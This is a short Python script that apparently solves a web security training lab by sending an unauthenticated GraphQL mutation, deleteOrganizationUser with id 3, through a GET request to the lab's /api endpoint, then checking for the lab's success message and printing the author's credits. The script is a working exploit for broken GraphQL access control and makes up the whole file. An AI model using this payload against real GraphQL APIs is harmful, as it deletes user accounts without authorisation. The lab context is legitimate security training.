import requests
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def delete_the_user(self):
        payload = '''
        mutation {
            deleteOrganizationUser(input: {id: 3}) {
                user {
                    id
                    username
                }
            }
        }'''
        params = {'query': payload}
        self.session.get(self.lab_url + 'api', params=params)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.delete_the_user()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
